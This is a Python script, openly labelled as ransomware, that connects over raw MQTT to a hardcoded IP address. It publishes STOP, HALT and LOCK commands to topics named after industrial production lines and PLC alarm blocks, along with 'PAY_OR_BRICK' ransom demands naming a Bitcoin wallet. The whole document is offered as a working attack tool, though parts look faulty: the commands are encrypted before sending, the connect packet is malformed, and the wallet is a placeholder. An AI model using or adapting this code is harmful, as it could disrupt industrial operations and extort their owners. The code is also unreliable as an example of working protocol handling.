#!/usr/bin/env python3
# MIL_RANSOMWARE_v4.0 - TRUSTEDF57 (NO CALLBACK - BASE PYTHON)
import socket, ssl, json, time, base64, os, threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

print("🚀 TRUSTEDF57 v4.0 - RAW MQTT (NO paho-mqtt)")

class MilitaryRansomware:
    def __init__(self):
        self.target_ip = "67.218.246.15"
        self.port = 1883
        self.btc_addr = "STAMMATIN-O-TENG-TUOST"
        self.ransom = "2.5"
        
        # AES-256 simple
        self.key = b"TRUSTEDF57MILKEY12345678901234567890"[:32]  # Fixed key
        self.iv = b"TRUSTEDF57IV1234567"[:16]
        
        # Salva key
        with open("key.aes", "wb") as f:
            f.write(self.key + self.iv)
        print("[KEY] Salvata key.aes")
        
        self.sock = None
        self.connected = False
    
    def aes_encrypt(self, data):
        padder = padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
        enc = cipher.encryptor()
        return base64.b64encode(enc.update(padded) + enc.finalize()).decode()
    
    def connect_raw(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.target_ip, self.port))
            print(f"[+] RAW MQTT connesso {self.target_ip}:{self.port}")
            
            # MQTT CONNECT
            connect_msg = self.build_connect()
            self.sock.send(connect_msg)
            resp = self.sock.recv(1024)
            if b"\x20\x02" in resp:  # CONNACK OK
                self.connected = True
                print("[+] MQTT CONNECT OK")
                return True
        except Exception as e:
            print(f"[!] Connect error: {e}")
        return False
    
    def build_connect(self):
        client_id = b"TRUSTEDF57_" + str(time.time()).encode()
        payload = b"\x00" + bytes([len(client_id)]) + client_id
        
        msg = b"\x10" + bytes([len(payload)]) + payload  # CONNECT
        return msg
    
    def publish_raw(self, topic, payload):
        if not self.connected: return
        
        enc_payload = self.aes_encrypt(payload.encode())
        topic_len = len(topic)
        payload_len = len(enc_payload)
        
        fixed_header = b"\x30" + bytes([2 + topic_len + payload_len])
        variable_header = bytes([topic_len]) + topic.encode()
        msg = fixed_header + variable_header + enc_payload.encode()
        
        try:
            self.sock.send(msg)
            print(f"[PUBLISH] {topic[:30]}...")
        except:
            self.connected = False
    
    def deploy_all(self):
        payloads = {
            "Linea5ResultsFromCyclicRead/Alarms_DB4": '{"cmd":"STOP","op":"TRUSTEDF57"}',
            "Linea4ResultsFromCyclicRead/Alarms_DB4": '{"cmd":"HALT","op":"TRUSTEDF57"}',
            "MoliendaResultsFromCyclicRead/Plc": '{"cmd":"LOCK","op":"TRUSTEDF57"}',
            "$SYS/broker/ransom/TRUSTEDF57": f"LOCK:{self.btc_addr}:{self.ransom}",
            "Linea5ResultsFromCyclicRead/Events": '{"ALARM":"PAY_OR_BRICK","BTC":"'+self.btc_addr+'"}'
        }
        
        for topic, data in payloads.items():
            self.publish_raw(topic, data)
            time.sleep(0.1)
        print("✅ ALL PAYLOADS INJECTED!")
    
    def listen_loop(self):
        while self.connected:
            try:
                data = self.sock.recv(1024)
                if data:
                    print(f"[RECV] {len(data)} bytes")
            except:
                self.connected = False
                break
    
    def ui(self):
        os.system('clear')
        print("="*60)
        print("🔴 TRUSTEDF57 v4.0 - RAW MQTT RANSOMWARE")
        print("="*60)
        print(f"TARGET: {self.target_ip}:{self.port}")
        print(f"STATUS: {'🔒 ACTIVE' if self.connected else '🔴 OFF'}")
        print(f"WALLET: {self.btc_addr}")
        print("="*60)
    
    def run(self):
        if self.connect_raw():
            listen_thread = threading.Thread(target=self.listen_loop, daemon=True)
            listen_thread.start()
            
            time.sleep(2)
            self.deploy_all()
            
            while True:
                self.ui()
                time.sleep(3)
        else:
            print("[!] Impossibile connettersi")

if __name__ == "__main__":
    rw = MilitaryRansomware()
    rw.run()
